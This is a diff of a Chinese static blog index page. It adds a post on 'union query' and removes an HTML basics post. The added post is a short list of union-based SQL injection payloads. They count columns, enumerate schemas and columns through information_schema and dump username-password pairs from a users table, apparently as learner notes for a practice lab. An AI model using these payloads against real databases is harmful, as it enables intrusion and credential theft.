@@ -62,6 +62,33 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-联合查询" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/14/联合查询/" class="article-date">
+  <time datetime="2019-08-14T11:25:24.764Z" itemprop="datePublished">2019-08-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">order by 49;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and 1=2 union select (select group_concat(schema_name) from information_schema.schemata),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and 1=2 union select (select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name = <span class="string">'users'</span>),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and 1=2 union select (select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name = <span class="string">'content'</span>),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and 1=2 union select (select group_concat(username,<span class="string">'-'</span>,passwd) from test.users ),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/14/联合查询/" data-id="cjzb666vj000740rmhl95iwub" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-select查询数据" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/08/12/select查询数据/" class="article-date">
@@ -88,7 +115,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/12/select查询数据/" data-id="cjz8gtvst00038ormhmza8uvi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/12/select查询数据/" data-id="cjzb666v9000340rmva8p2l5u" class="article-share-link">Share</a>
       
       
     </footer>
@@ -115,7 +142,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/新闻主页/" data-id="cjz8gtvtp000a8orm6qkl8vr3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/11/新闻主页/" data-id="cjzb666vl000840rm5sxr3xuk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -142,7 +169,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/增加新闻/" data-id="cjz8gtvtb00058ormd576qjo1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/11/增加新闻/" data-id="cjzb666vf000540rmio6wvzom" class="article-share-link">Share</a>
       
       
     </footer>
@@ -169,7 +196,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/登录页面/" data-id="cjz8gtvtv000b8ormldy95iq8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/11/登录页面/" data-id="cjzb666vq000a40rm22b8znmy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -196,7 +223,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/注册页面/" data-id="cjz8gtvtz000c8ormcf71m0l7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/11/注册页面/" data-id="cjzb666vo000940rmlkqzkfpi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -223,7 +250,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/07/五角星/" data-id="cjz8gtvtd00068ormf41kjmd9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/07/五角星/" data-id="cjzb666vc000440rml515wtme" class="article-share-link">Share</a>
       
       
     </footer>
@@ -250,7 +277,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/07/素数/" data-id="cjz8gtvtf00078ormafxus7xb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/07/素数/" data-id="cjzb666vh000640rm55l988t4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -277,7 +304,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/03/PHP基础/" data-id="cjz8gtvs700008ormg9662n0z" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/03/PHP基础/" data-id="cjzb666u0000040rm2rgxbo3v" class="article-share-link">Share</a>
       
       
     </footer>
@@ -304,111 +331,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/03/js基础/" data-id="cjz8gtvtn00098ormg8ovtrty" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-html基础" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/08/03/html基础/" class="article-date">
-  <time datetime="2019-08-03T14:06:04.386Z" itemprop="datePublished">2019-08-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h2><pre><code class="bash">什么是HTML：
-  • HTML指的是超文本标记语言
-  • HTML不是一种编程语言，而是一种标记语言
-  • 标记语言是一套标记标签，例如<span class="string">'&lt;div&gt;&lt;/div&gt;'</span> ‘&lt;p&gt;&lt;/p&gt;’
-  •HTML使用标记标签来描述网页
-
-
-
-
-
-
-
-一些简单的标签：
-  •&lt;html&gt; ：&lt;html&gt;与&lt;/html&gt;之间的文本描述网页
-  •&lt;body&gt;：&lt;body&gt;与&lt;/body&gt;之间的文本是可见的页面内容
-  •&lt;h1&gt;这是一个标题&lt;/h1&gt;：&lt;h1&gt;与&lt;/h1&gt; 之间的文本被显示为标题
-  •&lt;p&gt;这是一个段落&lt;/p&gt;    ：&lt;p&gt;与&lt;/p&gt;之间的文本被显示为段落
-
-
-
-
-
-
-
-  HTML中的标签：
-   •HTML标题是通过‘&lt;h1&gt;-&lt;h6&gt;’等标签进行定义的
-   •HTML段落是通过‘&lt;p&gt;’标签进行定义的
-   •HTML链接是通过‘&lt;a&gt;’标签进行定义的
-   •HTML图像是通过‘&lt;img&gt;’标签进行定义的
-   •HTML列表是通过‘&lt;ul&gt;’和<span class="string">'&lt;ol&gt;'</span>标签进行定义的。其中‘ul’一般用来表示无序列表，‘ol’用来表示有序列表
-   •HTML表格是通过‘table’ ‘thead’ ‘tbody’ ‘th’ ‘td’ 等标签来定义的
-
-img src=“地址”   显示图片
-
-
-
-
-
-HTML form表单：
-   &lt;form action=<span class="string">"www.baidu.com"</span>method=<span class="string">"get"</span> enctype=<span class="string">"application/x-www-form-urlencoded"</span>&gt; 
-               • Action属性表明表单将要提交到哪里
-               • Method表示提交用到的方法分别为get个post可选
-               • Enctype规定在发送表单数据前对数据进行编码的格式
-
-
-
-
-
-
-
-输入框‘&lt;input/&gt;’标签最常用
-
-   • <span class="built_in">type</span>=“text”普通的文本输入框
-   • <span class="built_in">type</span>=“password” 带型号的密码输入框
-   • <span class="built_in">type</span>=“radio”单选框              同一类型要有统一的name属性，表明是一类+
-   • <span class="built_in">type</span>=<span class="string">"checkbox"</span>复选框        添加checked属性会默认选中
-   • <span class="built_in">type</span>=“file”文件上传选择
-   • <span class="built_in">type</span>=“email”带简单验证的邮箱输入
-   • &lt;texteara&gt;标签input只能单行输入，texteara可以多行输入
-    &lt;center&gt;         &lt;/center&gt;    将代码输出的居中
-
-
-
-
-
-CSS样式的引入：
-     行内样式
-          &lt;p style= “display:none” &gt; &lt;/p&gt;
-
-      内嵌式
-           一般指&lt;head&gt;标签中的&lt;style&gt;样式
-
-       外链式
-            通过&lt;link&gt;标签引入外部的CSS文件
-
-        导入外部样式
-            用@import在&lt;head&gt;与&lt;/head&gt;间引入</code></pre>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/03/html基础/" data-id="cjz8gtvsw00048ormlgi0lefc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/03/js基础/" data-id="cjzb666vz000c40rmx5aneihl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -454,6 +377,10 @@ CSS样式的引入：
       <ul>
         
           <li>
+            <a href="/2019/08/14/联合查询/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2019/08/12/select查询数据/">(no title)</a>
           </li>
         
@@ -467,10 +394,6 @@ CSS样式的引入：
         
           <li>
             <a href="/2019/08/11/登录页面/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2019/08/11/注册页面/">(no title)</a>
           </li>
         
       </ul>
